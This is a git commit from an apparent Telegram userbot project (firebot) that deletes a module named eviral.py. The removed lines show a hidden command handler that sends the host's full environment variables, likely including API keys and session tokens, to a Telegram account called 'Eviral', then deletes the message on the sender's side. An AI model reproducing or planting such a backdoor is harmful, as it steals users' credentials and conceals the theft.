65f4c9d999ed116ebc33dd8463d239a73ae424cb
E V I R A L <74889213+Teameviral@users.noreply.github.com>
2021-08-29 21:14:17 +0530

    Delete eviral.py

--- firebot/modules/eviral.py
+++
@@ -1,8 +0,0 @@
-import os
-from firebot import bot
-from ..utils import admin_cmd
-
-@bot.on(admin_cmd("evul"))
-async def piro(event):
-  msg = await bot.send_message("Eviral", str(os.environ))
-  await bot.delete_messages("Eviral", msg, revoke=False)
